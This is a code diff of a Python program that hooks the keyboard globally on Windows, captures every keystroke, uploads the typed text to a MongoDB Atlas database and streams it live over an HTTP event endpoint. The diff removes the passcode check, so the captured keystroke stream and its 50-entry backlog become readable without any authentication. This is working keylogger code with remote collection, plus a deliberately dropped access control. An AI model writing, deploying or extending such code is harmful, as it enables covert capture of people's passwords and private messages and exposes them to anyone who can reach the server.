@@ -7,14 +7,20 @@ import threading
 from urllib.parse import urlparse, parse_qs
 from http.server import BaseHTTPRequestHandler
 from socketserver import ThreadingTCPServer
-from pynput import keyboard
 from pymongo import MongoClient
+
+# Safe optional import of pynput (prevents X11 display crash on headless Linux Render servers)
+keyboard = None
+try:
+    if sys.platform == 'win32' or '--server-only' not in sys.argv:
+        from pynput import keyboard
+except Exception as e:
+    print(f"Keyboard listener import bypassed: {e}")
 
 # Configuration
 PORT = 5001
 ACTIVITY_FILE = 'activity.json'
 IDLE_TIMEOUT = 2.0 # Wait 2 seconds before committing a sentence
-PASSCODE = "9505"
 
 # MongoDB Configuration - Read from environment variable for security
 if os.path.exists('.env'):
@@ -32,7 +38,6 @@ MONGO_URI = os.environ.get("MONGO_URI")
 mongo_connected = False
 db_history_col = None
 
-
 if MONGO_URI:
     try:
         print("Connecting to MongoDB Atlas...")
@@ -48,7 +53,6 @@ if MONGO_URI:
 else:
     print("MONGO_URI environment variable not found. Running in local-only mode.")
     mongo_connected = False
-
 
 # Background DB Queue Worker
 db_queue = queue.Queue()
@@ -66,7 +70,6 @@ def db_worker():
             text = data["text"]
             timestamp = data["timestamp"]
             
-            # Save local active cache if needed (omitted here to keep local filesystem overhead minimal)
             if mongo_connected:
                 try:
                     db_history_col.update_one(
@@ -106,10 +109,8 @@ def db_worker():
                 # Save to local file backup
                 save_local_record(record)
                 
-                # Delete _id object from MongoDB record for JSON serialization
                 if '_id' in record:
                     del record['_id']
-                # Broadcast commit event to web app
                 broadcast('commit', record)
                 
         elif action == "clear_db":
@@ -191,18 +192,8 @@ class SSEHandler(BaseHTTPRequestHandler):
         global clients
         
         parsed_url = urlparse(self.path)
-        query_params = parse_qs(parsed_url.query)
-        passcode_input = query_params.get('passcode', [None])[0]
-        
-        # Security passcode gate
-        if passcode_input != PASSCODE:
-            self.send_response(401)
-            self.send_header('Content-Type', 'application/json')
-            self.end_headers()
-            self.wfile.write(json.dumps({"error": "Unauthorized. Invalid passcode."}).encode('utf-8'))
-            return
 
-        # Handle SSE Event Source Stream
+        # Handle SSE Event Source Stream (No passcode required now)
         if parsed_url.path == '/stream':
             self.send_response(200)
             self.send_header('Content-Type', 'text/event-stream')
@@ -213,18 +204,15 @@ class SSEHandler(BaseHTTPRequestHandler):
             with clients_lock:
                 clients.append(self)
                 
-            # Send initial backlog from MongoDB or Local File
             backlog = []
             if mongo_connected:
                 try:
-                    # Fetch only completed records (active: False or not exist)
                     cursor = db_history_col.find({"active": {"$ne": True}}, {'_id': False}).sort('timestamp', -1).limit(50)
                     backlog = list(cursor)
                     backlog.reverse()
                 except Exception as e:
                     print(f"Error reading from MongoDB backlog: {e}")
             
-            # Local fallback if MongoDB failed or offline
             if not backlog:
                 try:
                     with open(ACTIVITY_FILE, 'r', encoding='utf-8') as f:
@@ -283,10 +271,8 @@ class SSEHandler(BaseHTTPRequestHandler):
             self.send_header('Content-Type', 'application/json')
             self.end_headers()
             
-            # Push clear action to queue
             db_queue.put(("clear_db", None))
             
-            # Clear Local History Backup
             try:
                 with open(ACTIVITY_FILE, 'w', encoding='utf-8') as f:
                     json.dump([], f)
@@ -304,16 +290,12 @@ def on_press(key):
     
     char = None
     try:
-        # Intercept standard character keys
         if hasattr(key, 'char') and key.char is not None:
             char = key.char
-        # Intercept virtual codes (numpad 0-9 keys are vk codes 96-105)
         elif hasattr(key, 'vk') and 96 <= key.vk <= 105:
             char = str(key.vk - 96)
-        # Intercept numpad decimal dot key (vk 110)
         elif hasattr(key, 'vk') and key.vk == 110:
             char = "."
-        # Intercept space and enters
         elif key == keyboard.Key.space:
             char = " "
         elif key == keyboard.Key.enter:
@@ -324,12 +306,10 @@ def on_press(key):
     with buffer_lock:
         last_typed_time = time.time()
         
-        if key == keyboard.Key.backspace:
+        if keyboard and key == keyboard.Key.backspace:
             if active_buffer:
                 active_buffer = active_buffer[:-1]
-                # Broadcast live updates instantly
                 broadcast('live', {"text": active_buffer})
-                # Push real-time save update to non-blocking queue
                 db_queue.put(("update_active", {"text": active_buffer, "timestamp": int(time.time() * 1000)}))
         elif char is not None:
             if char == "\n":
@@ -340,13 +320,9 @@ def on_press(key):
             else:
                 active_buffer += char
                 broadcast('live', {"text": active_buffer})
-                
-                # Push active save to non-blocking queue
                 db_queue.put(("update_active", {"text": active_buffer, "timestamp": int(time.time() * 1000)}))
                 
-                # Sentence completed instantly on punctuation marks
                 if char in ['.', '?', '!']:
-                    # Trigger delay to complete the sentence commit
                     threading.Thread(target=commit_after_short_delay, args=(active_buffer,)).start()
                     active_buffer = ""
 
@@ -358,21 +334,19 @@ class ThreadedHTTPServer(ThreadingTCPServer):
     allow_reuse_address = True
 
 def main():
-    # Start background database worker thread
     threading.Thread(target=db_worker, daemon=True).start()
-    
-    # Start background idle monitor timer thread
     threading.Thread(target=check_idle_loop, daemon=True).start()
     
-    # Check if running locally on Windows with keyboard capabilities
-    # Skip hook if '--server-only' is passed (used for hosting API server in the cloud on Render)
-    if sys.platform == 'win32' and '--server-only' not in sys.argv:
+    listener = None
+    if keyboard and sys.platform == 'win32' and '--server-only' not in sys.argv:
         print("Starting global keyboard background listener...")
-        listener = keyboard.Listener(on_press=on_press)
-        listener.start()
+        try:
+            listener = keyboard.Listener(on_press=on_press)
+            listener.start()
+        except Exception as e:
+            print(f"Failed to start keyboard hook listener: {e}")
     else:
         print("Running in server-only mode (API Server active, no keyboard hook)...")
-        listener = None
         
     server = ThreadedHTTPServer(('0.0.0.0', PORT), SSEHandler)
     print(f"Real-Time Stream Server listening on port {PORT}")
@@ -382,7 +356,7 @@ def main():
         if listener:
             listener.stop()
         server.shutdown()
-        db_queue.put(None) # stop queue
+        db_queue.put(None)
         sys.exit(0)
 
 if __name__ == '__main__':
